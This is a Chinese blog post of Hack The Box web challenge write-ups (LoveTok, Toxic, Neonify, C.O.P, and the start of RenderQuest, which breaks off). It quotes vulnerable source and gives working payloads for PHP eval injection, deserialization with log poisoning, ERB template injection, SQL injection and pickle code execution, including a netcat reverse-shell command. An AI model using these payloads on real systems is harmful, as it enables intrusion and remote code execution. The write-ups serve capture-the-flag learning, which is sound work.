<!-- build time:Tue Jun 17 2025 23:32:17 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="ililiiY" href="https://lookhui.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="ililiiY" href="https://lookhui.github.io/atom.xml"><link rel="alternate" type="application/json" title="ililiiY" href="https://lookhui.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="WEB"><link rel="canonical" href="https://lookhui.github.io/HTB-WEB-md/"><title>HTB-WEB - HTB | look-hui = ililiiY = lookhui</title><meta name="generator" content="Hexo 7.2.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">HTB-WEB</h1><div class="meta"><span class="item" title="创建时间：2023-12-13 08:49:46"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-12-13T08:49:46+08:00">2023-12-13</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">look-hui</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://www.loliapi.com/acg/?635277"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?555907"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?194484"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?883520"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?742107"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?989419"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/HTB/" itemprop="item" rel="index" title="分类于 HTB"><span itemprop="name">HTB</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lookhui.github.io/HTB-WEB-md/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="c0iq"><meta itemprop="description" content="lookhui, 坚持与努力"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="ililiiY"></span><div class="body md" itemprop="articleBody"><h3 id="lovetok"><a class="anchor" href="#lovetok">#</a> LoveTok</h3><p>查看这个主页这个代码调用了另外一个地方的代码 timecontroller 先以 get 请求进去之后在使用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TimeController</span><br><span class="line">&#123;</span><br><span class="line">    public function index($router)</span><br><span class="line">    &#123;</span><br><span class="line">        $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] :&#x27;r&#x27;;</span><br><span class="line">        $time = new TimeModel($format);</span><br><span class="line">        return $router-&gt;view(&#x27;index&#x27;, [&#x27;time&#x27; =&gt; $time-&gt;getTime()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>这个 timecontroller 的代码有了一个 get 请求并且直接将这个 get 请求的内容 format 放进 timemodlqu 进行调用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TimeModel</span><br><span class="line">&#123;</span><br><span class="line">    public function __construct($format)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;format = addslashes($format);</span><br><span class="line"></span><br><span class="line">        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];</span><br><span class="line">        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getTime()</span><br><span class="line">    &#123;</span><br><span class="line">        eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;);</span><br><span class="line">        return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>上面这个代码主要是查看到了一个 eval 代码可以判断为漏洞点，刚刚调用的是 timemode1 的方法并且这个里面的 gettime 方法里面还调用了 format 刚好触发 eval 来直接执行命令，相当于触发了 ${system (ls)} 漏洞也就是说 ssti 漏洞被触发</p><h3 id="toxic"><a class="anchor" href="#toxic">#</a> Toxic</h3><p>白盒测试，首先看源代码，发现</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">spl_autoload_register(function ($name)&#123;</span><br><span class="line">    if (preg_match(&#x27;/Model$/&#x27;, $name))</span><br><span class="line">    &#123;</span><br><span class="line">        $name = &quot;models/$&#123;name&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    include_once &quot;$&#123;name&#125;.php&quot;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&#x27;PHPSESSID&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $page = new PageModel;</span><br><span class="line">    $page-&gt;file = &#x27;/www/index.html&#x27;;</span><br><span class="line"></span><br><span class="line">    setcookie(</span><br><span class="line">        &#x27;PHPSESSID&#x27;, </span><br><span class="line">        base64_encode(serialize($page)), </span><br><span class="line">        time()+60*60*24, </span><br><span class="line">        &#x27;/&#x27;</span><br><span class="line">    );</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$cookie = base64_decode($_COOKIE[&#x27;PHPSESSID&#x27;]);</span><br><span class="line">unserialize($cookie);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>这里使用的是一个反序列化代码并且 new pageMode1</p><p>我们去看这个 pageMode1</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PageModel</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line"></span><br><span class="line">    public function __destruct() </span><br><span class="line">    &#123;</span><br><span class="line">        include($this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>发现这个编码使用的是一个__destruct () 来进行包含查看源码，index.php 里面还给了 file 进行了定义值，并且 cookie 处来设定，并且只是使用了一个 base64 来进行加密，我们去访问网站把 cookie copy 一下进行解码</p><p><img data-src="/pic/image-20231208154207149.png" alt=""></p><p>这里可以发现这个我们可以利用文件包含来查看任意内容，但是查看 entrypoint.sh 发现初始化时把 flag 给更改为 flag_加 5 个随机字符</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/ash</span><br><span class="line"></span><br><span class="line"># Secure entrypoint</span><br><span class="line">chmod 600 /entrypoint.sh</span><br><span class="line"></span><br><span class="line"># Generate random flag filename</span><br><span class="line">mv /flag /flag_`cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1`</span><br><span class="line"></span><br><span class="line">exec &quot;$@&quot;</span><br></pre></td></tr></table></figure><p></p><p>现在可以想到的方法有去爆破他的 5 位随机字符代码如下</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">random=str(os.system(&quot;cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1&quot;))</span><br><span class="line">print(random)</span><br><span class="line">url=&#x27;http://159.65.20.166:31290/&#x27;</span><br><span class="line">php=&#x27;O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:60:&quot;php://filter/read=convert.base64-encode/resource=/flag_&#x27;+random+&#x27;&quot;;&#125;&#x27;</span><br><span class="line">print(1)</span><br><span class="line">cookie=base64.b64encode(php.encode())</span><br><span class="line">header=&#123;</span><br><span class="line">    &quot;Cookie&quot;:f&quot;PHPSESSID=&#123;cookie&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pro=requests.get(url,headers=header,timeout=0.5)</span><br><span class="line">print(cookie)</span><br><span class="line">print(len(pro.text))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>爆破的话不太实际需要的时间太久，我们可以使用日志包含 php 然后通过访问访问达到文件包含来利用这个漏洞，因为访问页面时我们的浏览器表头 user-agent 和访问路径会被记录到日志上那可以使用如：</p><ol><li>首先使用 hackbar 来修改 header 的 user-agent:&lt;?php system ('ls /'); ?&gt;</li><li>使用 hackbar 修改 header 的 Cookie 的 phpsessid 来等于 O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;} 进行 base 加密就能得到 flag 命名</li><li>把 &lt;?php system ('cat /flag_1de1w'); ?&gt; 可以或者更改 cookie 也行</li></ol><h3 id="neonify"><a class="anchor" href="#neonify">#</a> Neonify</h3><p>这个 ruby 我第一次玩，白盒测试打开主代码 index.erb</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Neonify&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;stylesheets/style.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;icon&quot; type=&quot;image/gif&quot; href=&quot;/images/gem.gif&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">        &lt;h1 class=&quot;title&quot;&gt;Amazing Neonify Generator&lt;/h1&gt;</span><br><span class="line">        &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;p&gt;Enter Text to Neonify&lt;/p&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;neon&quot; value=&quot;&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;h1 class=&quot;glow&quot;&gt;&lt;%= @neon %&gt;&lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p></p><p>里面的 &lt;%=@neon%&gt; 可以初步分析判断为 ssti 注入，然后再看 neon.rb</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class NeonControllers &lt; Sinatra::Base</span><br><span class="line"></span><br><span class="line">  configure do</span><br><span class="line">    set :views, &quot;app/views&quot;</span><br><span class="line">    set :public_dir, &quot;public&quot;</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  get &#x27;/&#x27; do</span><br><span class="line">    @neon = &quot;Glow With The Flow&quot;</span><br><span class="line">    erb :&#x27;index&#x27;</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  post &#x27;/&#x27; do</span><br><span class="line">    if params[:neon] =~ /^[0-9a-z ]+$/i</span><br><span class="line">      @neon = ERB.new(params[:neon]).result(binding)</span><br><span class="line">    else</span><br><span class="line">      @neon = &quot;Malicious Input Detected&quot;</span><br><span class="line">    end</span><br><span class="line">    erb :&#x27;index&#x27;</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p></p><p>里面有一个分别为 get 和 post，如果你使用 post 方法的话会进行正则匹配是否为数字和字母如果不是直接等于</p><p>Malicious Input Detected</p><p>如果是的情况下就会在输出一下这个变量，查资料得到这个正则匹配可以通过匹配 %0a 来达到绕过手段也就是说使用 \n 就能绕过和 php 一样，那么直接在 index.erb 里面输入 1%0a&lt;/h1&gt;&lt;%25=open ('|cat f*').read ()%25&gt;&lt;h1 &gt; 这样就能达到任意命令执行的效果</p><p><img data-src="/pic/image-20231208163006608.png" alt="image-20231208163006608"></p><p>使用 &lt;%= File.open ('flag.txt').read %&gt; 也能得到 flag 但是需要进行 urlencode</p><h3 id="cop"><a class="anchor" href="#cop">#</a> C.O.P</h3><p>这个代码是 python 写的打开后能发现这个代码 models.py 里面的代码</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class shop(object):</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def select_by_id(product_id):</span><br><span class="line">        return query_db(f&quot;SELECT data FROM products WHERE id=&#x27;&#123;product_id&#125;&#x27;&quot;, one=True)</span><br></pre></td></tr></table></figure><p></p><p>还有 database.py 里面的代码如</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from flask import g</span><br><span class="line">from application import app</span><br><span class="line">from sqlite3 import dbapi2 as sqlite3</span><br><span class="line">import base64, pickle</span><br><span class="line"></span><br><span class="line">def connect_db():</span><br><span class="line">    return sqlite3.connect(&#x27;cop.db&#x27;, isolation_level=None)</span><br><span class="line">    </span><br><span class="line">def get_db():</span><br><span class="line">    db = getattr(g, &#x27;_database&#x27;, None)</span><br><span class="line">    if db is None:</span><br><span class="line">        db = g._database = connect_db()</span><br><span class="line">        db.row_factory = sqlite3.Row</span><br><span class="line">    return db</span><br><span class="line"></span><br><span class="line">def query_db(query, args=(), one=False):</span><br><span class="line">    with app.app.app_context():</span><br><span class="line">        cur = get_db().execute(query, args)</span><br><span class="line">        rv = [dict((cur.description[idx][0], value) \</span><br><span class="line">            for idx, value in enumerate(row)) for row in cur.fetchall()]</span><br><span class="line">        return (next(iter(rv[0].values())) if rv else None) if one else rv</span><br><span class="line"></span><br><span class="line">class Item:</span><br><span class="line">	def __init__(self, name, description, price, image):</span><br><span class="line">		self.name = name</span><br><span class="line">		self.description = description</span><br><span class="line">		self.image = image</span><br><span class="line">		self.price = price</span><br><span class="line"></span><br><span class="line">def migrate_db():</span><br><span class="line">    items = [</span><br><span class="line">        Item(&#x27;Pickle Shirt&#x27;, &#x27;Get our new pickle shirt!&#x27;, &#x27;23&#x27;, &#x27;/static/images/pickle_shirt.jpg&#x27;),</span><br><span class="line">        Item(&#x27;Pickle Shirt 2&#x27;, &#x27;Get our (second) new pickle shirt!&#x27;, &#x27;27&#x27;, &#x27;/static/images/pickle_shirt2.jpg&#x27;),</span><br><span class="line">        Item(&#x27;Dill Pickle Jar&#x27;, &#x27;Literally just a pickle&#x27;, &#x27;1337&#x27;, &#x27;/static/images/pickle.jpg&#x27;),</span><br><span class="line">        Item(&#x27;Branston Pickle&#x27;, &#x27;Does this even fit on our store?!?!&#x27;, &#x27;7.30&#x27;, &#x27;/static/images/branston_pickle.jpg&#x27;)</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    with open(&#x27;schema.sql&#x27;, mode=&#x27;r&#x27;) as f:</span><br><span class="line">        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)</span><br><span class="line">        get_db().cursor().executescript(f.read().format(*list(shop)))</span><br></pre></td></tr></table></figure><p></p><p>这个 sql 语句能直接产生 sql 注入，还有就是这个 pickle (泡菜) 看到 pickle 我们就能想到 python 的反序列化</p><p>先去页面注入尝试一下</p><p><img data-src="/pic/image-20231210134014962.png" alt="image-20231210134014962"></p><p>发现</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;order by 1--+不报错</span><br><span class="line">1&#x27;order by 2--+直接报错</span><br></pre></td></tr></table></figure><p></p><p>那直接使用 sqlmap 跑一次试试，发现使用的是 SQLite 数据库，那么我们就无法直接进行读取文件了，因为 sqlite 无法直接 --os-shell，这些表里也没有其他内容，那么进攻点就还有 pickle 了</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)</span><br></pre></td></tr></table></figure><p></p><p>按照这个思路的话可以构造执行 shell 命令拼接 sql 语句，无效化前面的商品，利用 union select 能够直接将反序列化的代码传入</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">payload = &#x27;cp flag.txt application/static/.&#x27;</span><br><span class="line"></span><br><span class="line">class RCE:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return os.system, (payload,)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(base64.b64encode(pickle.dumps(RCE())))</span><br></pre></td></tr></table></figure><p></p><p>需要注意的点是这段代码需要使用 linux 运行，因为 windows 运行的 base64 编码后和 linux 的不一样</p><p>如</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows:gASVOAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br><span class="line">linux:gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br></pre></td></tr></table></figure><p></p><p>然后利用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select &#x27;gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br><span class="line">或者&#x27; union select &#x27;gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg== &#x27;--+</span><br></pre></td></tr></table></figure><p></p><p>在访问 /static/flag.txt 即可得到 flag</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">payload = &#x27;nc 172.25.36.114 8888 -e /bin/bash&#x27;</span><br><span class="line"></span><br><span class="line">class RCE:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return os.system, (payload,)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode(&#x27;ascii&#x27;))</span><br></pre></td></tr></table></figure><p></p><p>在使用相同的办法直接进行反弹 shell，注意这样只能在本地才行</p><h3 id="renderquest"><a class="anchor" href="#renderquest">#</a> RenderQuest</h3><p>很棒的一题，这题让我理解了一下 golang 的模板渲染，首先查看 main.go 代码</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 